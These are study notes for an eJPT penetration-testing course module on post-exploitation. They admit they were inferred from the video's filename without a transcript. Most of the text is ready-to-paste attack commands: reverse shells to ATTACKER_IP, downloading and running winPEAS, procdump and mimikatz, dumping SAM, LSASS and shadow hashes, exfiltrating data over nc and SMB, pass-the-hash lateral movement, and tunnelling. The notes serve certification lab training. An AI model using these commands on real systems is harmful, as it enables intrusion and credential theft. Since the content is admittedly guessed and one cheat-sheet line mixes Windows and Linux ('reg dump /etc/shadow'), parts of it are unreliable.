# 03 – Post‑Exploitation Methodology (eJPT) — Summary Notes

Note: No transcript was provided. The following is a conservative, standard eJPT-aligned post‑exploitation methodology inferred from the filename/context (01‑Post‑Exploitation/03‑Post‑Exploitation Methodology.mp4).

## What the video covers (Introduction / big picture)

- Objective: What to do after you gain a foothold on a target:
  - Stabilize access (shell/agent), gain situational awareness, escalate privileges, harvest credentials, persist (if in scope), pivot, laterally move, and loot data — with minimal impact and clear documentation.
- Emphasis on a repeatable, safe process:
  - OPSEC and scope checks, host/network triage, privilege escalation paths, credential access, internal discovery, pivoting, lateral movement, exfiltration, cleanup, and reporting.
- Cross‑platform focus (Linux and Windows) with practical commands and common tooling used in eJPT labs.

## Flow (ordered)

1. Confirm scope and OPSEC (what’s allowed: persistence, log tampering, password dumping, etc.).
2. Stabilize your foothold (upgrade TTY, get reliable I/O).
3. Quick host triage (who/where/what security controls).
4. Local enumeration for privilege escalation (manual + automated).
5. Attempt privilege escalation (Linux/Windows techniques per findings).
6. Credential harvesting (files, memory, SAM/LSA, app configs).
7. Local loot collection (keys, configs, DB creds, tokens).
8. Internal network recon (interfaces, routes, live hosts, shares).
9. Pivoting/tunneling (SOCKS/port-forwards) and lateral movement.
10. Data exfiltration (minimal, targeted).
11. Cleanup (within scope) and documentation of all actions and evidence.

## Tools highlighted

- Built-ins: bash/sh, Python, PowerShell, cmd.exe, net, reg, sc, schtasks, wmic, whoami, systeminfo, ipconfig, netstat/ss, findstr/grep.
- Shell/TTY: nc/ncat, socat, rlwrap, script.
- Enumeration/Privesc:
  - Linux: linPEAS, manual checks (SUID, sudo -l, cron, capabilities, PATH).
  - Windows: winPEAS, PowerUp, Seatbelt, SharpUp, manual service/scheduled task checks.
- Credentials:
  - Windows: Mimikatz, Procdump + pypykatz, Impacket secretsdump, LaZagne.
  - Linux: unshadow + John/Hashcat, LaZagne, app configs.
- Lateral/pivot:
  - Impacket (psexec.py, wmiexec.py, smbexec.py, secretsdump.py), evil‑winrm, crackmapexec (CME), xfreerdp/xfreerdp, smbclient/Impacket smbserver.
  - Tunnels: chisel, socat, SSH (-D/-L), proxychains, sshuttle.
- Transport/hosting: python3 -m http.server, certutil, Invoke‑WebRequest (PowerShell), curl/wget, bitsadmin.

## Typical command walkthrough (detailed, copy‑paste friendly)

Replace ATTACKER_IP and ports/targets as needed.

### 0) Attacker prep

```bash
# Listener (reverse shell)
rlwrap -cAr nc -lvnp 4444

# Simple web server for file transfer
python3 -m http.server 8000

# SMB share for easy exfil (run where you want files to land)
impacket-smbserver share $(pwd) -smb2support
```

### 1) Stabilize foothold

Linux TTY upgrade:

```bash
# In a basic shell on victim:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background the shell, then on your attacker box:
stty raw -echo; fg
reset
stty rows 55 columns 200
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Netcat fallback reverse shell (if you need to trigger from a web shell):

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

socat fully interactive TTY:

```bash
# Attacker:
socat -d -d TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
# Victim (Linux):
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Windows one‑liner reverse shell (PowerShell):

```powershell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$s.Write(([Text.Encoding]::ASCII).GetBytes($sb2),0,$sb2.Length);$s.Flush()};$c.Close()"
```

### 2) Quick host triage

Linux:

```bash
id && whoami && hostname -f
uname -a; cat /etc/os-release
sudo -n -l 2>/dev/null || echo "No passwordless sudo"
echo $SHELL; echo $PATH; env | sort
ip a; ip r; ss -tulpn
arp -a; cat /etc/resolv.conf
last -n 3 2>/dev/null || true
ls -la /home; getent passwd | cut -d: -f1,3,6 | column -s: -t
ps aux | grep -Ei 'defender|edr|crowd|carbon|sentinel|sysmon' | grep -v grep
systemctl list-timers --all 2>/dev/null | head
crontab -l 2>/dev/null; ls -lah /etc/cron*; cat /etc/crontab 2>/dev/null
```

Windows (cmd + PowerShell mix):

```cmd
whoami /all
hostname & ver
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig /all
route print
arp -a
netstat -ano
query user
net users
net localgroup administrators
wmic qfe get Caption,Description,HotFixID,InstalledOn
tasklist /v | findstr /i "defender crowdstrike carbon black sentinel cylance"
```

### 3) Privilege escalation enumeration

Linux:

```bash
# Automated
curl -sS http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out

# Manual hotspots
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ls -lah /etc/cron*; cat /etc/crontab 2>/dev/null
find / -type f -writable -maxdepth 3 2>/dev/null | head
grep -RniE "pass|secret|token|api[_-]?key" /etc /var/www /home 2>/dev/null | head
ls -la ~/.ssh; ls -la /root/.ssh 2>/dev/null
```

Windows:

```cmd
:: winPEAS
powershell -nop -w hidden -c "iwr -useb http://ATTACKER_IP:8000/winPEASx64.exe -OutFile $env:TEMP\winpeas.exe; & $env:TEMP\winpeas.exe"

:: Manual checks
whoami /priv
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i " "
schtasks /query /fo LIST /v
icacls "C:\Program Files" | findstr /i "(F) (M) (W)"
```

Example exploitation triggers (only if identified and in scope):

- Linux sudo NOPASSWD on benign binary (check GTFOBins):
```bash
sudo -l
# Example if find is allowed:
sudo /usr/bin/find . -exec /bin/sh -p \; -quit
```

- Windows AlwaysInstallElevated (MSI as SYSTEM):
```cmd
:: Build a malicious MSI (on attacker) with msfvenom or use a known benign test; then on victim:
msiexec /quiet /qn /i C:\Path\to\payload.msi
```

### 4) Credential harvesting

Linux:

```bash
# Web/app configs
grep -RniE "pass|user|db|secret|token|key" /var/www /opt /home 2>/dev/null | head -n 50
cat /var/www/html/wp-config.php 2>/dev/null

# SSH keys
ls -la ~/.ssh; cat ~/.ssh/id_rsa 2>/dev/null

# If root, dump hashes
cp /etc/passwd /tmp/passwd.bak
cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.txt
```

Windows:

```cmd
:: Save SAM/SECURITY/SYSTEM for offline dump (needs Admin)
reg save HKLM\SAM C:\Windows\Temp\SAM.save
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.save

:: Procdump LSASS (Admin; AV may block)
powershell -c "iwr -useb http://ATTACKER_IP:8000/procdump64.exe -OutFile $env:TEMP\procdump.exe; & $env:TEMP\procdump.exe -accepteula -ma lsass.exe $env:TEMP\lsass.dmp"

:: Mimikatz (if allowed)
powershell -c "iwr -useb http://ATTACKER_IP:8000/mimikatz.exe -OutFile $env:TEMP\mimikatz.exe; & $env:TEMP\mimikatz.exe"
```

Attacker-side parsing:

```bash
# SAM/SECURITY/SYSTEM offline dump
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL

# LSASS dump
pypykatz lsa minidump lsass.dmp
```

### 5) Internal network recon

Linux:

```bash
ip a; ip r
nmap -sn 10.0.0.0/24
nbtscan -r 10.0.0.0/24 2>/dev/null || true
```

Windows:

```cmd
ipconfig /all
route print
arp -a
net view /domain
net view \\TARGET 2>&1
```

### 6) Pivoting/tunneling

Chisel reverse SOCKS from victim to attacker:

```bash
# Attacker:
./chisel server -p 8000 --reverse
# Victim:
./chisel client ATTACKER_IP:8000 R:1080:socks
# Attacker: configure proxychains to use SOCKS5 127.0.0.1 1080
```

SSH dynamic SOCKS (if you have SSH creds to pivot host):

```bash
ssh -D 1080 -N user@pivot_host
```

Proxychains scan through tunnel:

```bash
proxychains -q nmap -sT -Pn -n --open 10.0.0.0/24
```

Local port forward example (SSH):

```bash
ssh -L 127.0.0.1:3306:127.0.0.1:3306 user@pivot_host
```

### 7) Lateral movement

With credentials/hashes:

```bash
# CrackMapExec quick checks
crackmapexec smb 10.0.0.0/24 -u USER -p 'PASS' --shares
crackmapexec smb 10.0.0.0/24 -u USER -H NTLMHASH --local-auth

# Impacket psexec / wmiexec
psexec.py DOMAIN/USER@HOST
psexec.py -hashes LMHASH:NTHASH USER@HOST
wmiexec.py USER@HOST 'whoami'
wmiexec.py -hashes LMHASH:NTHASH USER@HOST

# WinRM shell
evil-winrm -i HOST -u USER -p 'PASS'
evil-winrm -i HOST -u USER -H NTHASH
```

RDP:

```bash
xfreerdp /v:HOST /u:USER /p:PASS /dynamic-resolution /cert:ignore
```

### 8) Exfiltration

Linux:

```bash
# To attacker via SMB share (started earlier)
cp /tmp/unshadowed.txt /mnt 2>/dev/null || true
# Or netcat
nc ATTACKER_IP 4445 < /tmp/unshadowed.txt   # Attacker: nc -lvnp 4445 > loot.txt
# Or HTTP GET from attacker
curl -O http://ATTACKER_IP:8000/toolname
```

Windows:

```cmd
:: Copy to attacker SMB share
net use \\ATTACKER_IP\share
copy C:\Windows\Temp\SAM.save \\ATTACKER_IP\share\
copy C:\Windows\Temp\SYSTEM.save \\ATTACKER_IP\share\
copy C:\Windows\Temp\SECURITY.save \\ATTACKER_IP\share\
```

### 9) Cleanup (only if in scope)

Linux:

```bash
rm -f /tmp/linpeas.sh /tmp/linpeas.out /tmp/passwd.bak /tmp/shadow.bak /tmp/unshadowed.txt /tmp/f
# Avoid destructive log tampering unless explicitly permitted.
```

Windows:

```cmd
del %TEMP%\winpeas.exe %TEMP%\procdump.exe %TEMP%\lsass.dmp 2>NUL
del C:\Windows\Temp\SAM.save C:\Windows\Temp\SYSTEM.save C:\Windows\Temp\SECURITY.save 2>NUL
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /f 2>NUL
net use \\ATTACKER_IP\share /delete 2>NUL
```

Document timestamps, commands run, and artifacts collected.

## Practical tips

- Decide early: do you need persistence (allowed?), or is escalation + loot enough for the objective.
- Upgrade shells immediately; interactive TTY saves time and reduces errors.
- Run automated enum (linPEAS/winPEAS), but also do quick manual checks for “low‑hanging fruit.”
- Always capture config files of apps you compromise; credentials often hide in plain text.
- Use SOCKS pivoting to keep tools on your box; minimize tool uploads on target to avoid detection.
- Prefer pass‑the‑hash/ticket over dumping passwords when possible.
- Keep a “loot” folder with clear hostnames/IPs and subfolders for creds, configs, and outputs.
- Be surgical: small nmap scans, targeted directory searches, minimal exfil.
- Respect OPSEC and scope — no destructive log wiping in typical eJPT labs unless directed.

## Minimal cheat sheet (one‑screen flow)

- Stabilize
  - Linux TTY: python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm; stty raw -echo; fg; reset
  - Attacker listener: rlwrap nc -lvnp 4444
- Triage
  - Linux: id; sudo -l; uname -a; cat /etc/os-release; ip a; ss -tulpn; crontab -l; find / -perm -4000 -type f 2>/dev/null
  - Windows: whoami /all; systeminfo; ipconfig /all; netstat -ano; schtasks /query /fo LIST /v; wmic service …
- Privesc enum
  - Linux: curl http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh; chmod +x; /tmp/linpeas.sh
  - Windows: iwr -useb http://ATTACKER_IP:8000/winPEASx64.exe -OutFile $env:TEMP\winpeas.exe; & $env:TEMP\winpeas.exe
- Creds
  - Linux: grep -R "pass|secret|key" /var/www /etc /home; if root: reg dump /etc/shadow -> unshadow
  - Windows: reg save SAM/SYSTEM/SECURITY; procdump lsass; secretsdump/pypykatz
- Pivot
  - Attacker: chisel server -p 8000 --reverse
  - Victim: chisel client ATTACKER_IP:8000 R:1080:socks
  - proxychains -q nmap -sT -Pn -n --open 10.0.0.0/24
- Lateral
  - psexec.py USER@HOST or -hashes LM:NTHASH
  - evil-winrm -i HOST -u USER -p PASS
  - crackmapexec smb 10.0.0.0/24 -u USER -p PASS --shares
- Exfil
  - SMB: impacket-smbserver share $(pwd)
  - Windows: copy loot to \\ATTACKER_IP\share\

## Summary

This module outlines a disciplined post‑exploitation methodology: stabilize access, rapidly triage the host, enumerate and exploit privilege escalation paths, harvest credentials, and expand access via pivoting and lateral movement — all while keeping actions within scope, minimal, and well‑documented. The commands and tools above reflect common eJPT workflows across Linux and Windows targets.